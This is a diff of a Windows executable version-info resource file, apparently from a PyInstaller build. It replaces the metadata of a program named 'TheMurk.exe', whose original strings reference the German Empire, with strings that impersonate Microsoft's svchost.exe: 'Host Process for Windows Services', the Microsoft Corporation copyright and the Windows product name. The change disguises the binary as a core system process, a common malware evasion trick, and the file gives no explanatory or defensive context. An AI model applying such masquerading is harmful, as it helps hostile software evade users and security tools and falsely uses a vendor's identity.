@@ -29,16 +29,16 @@ VSVersionInfo(
       [
       StringTable(
         '000004b0',
-        [StringStruct('Comments', ' Hail to Thee in the Victor\'s Crown'),
-        StringStruct('LegalCopyright', 'Copyright \xA9 Otto von Bismarck  1871'),
-        StringStruct('CompanyName', 'German Empire'),
-        StringStruct('FileDescription', 'God with us'),
+        [StringStruct('Comments', ''),
+        StringStruct('LegalCopyright', '\xA9 Microsoft Corporation. All rights reserved.'),
+        StringStruct('CompanyName', 'Microsoft Corporation'),
+        StringStruct('FileDescription', 'Host Process for Windows Services'),
         StringStruct('FileVersion', '9.2.7.0'),
         StringStruct('ProductVersion', '9.2.7.0'),
-        StringStruct('InternalName', 'TheMurk.exe'),
+        StringStruct('InternalName', 'svchost.exe'),
         StringStruct('LegalTrademarks', ''),
-        StringStruct('OriginalFilename', 'TheMurk.exe'),
-        StringStruct('ProductName', 'German Empire'),
+        StringStruct('OriginalFilename', 'svchost.exe'),
+        StringStruct('ProductName', 'Microsoft\xAE Windows\xAE Operating System'),
         StringStruct('BuildID', '04292023927')])
       ]), 
     VarFileInfo([VarStruct('Translation', [0, 1200])])
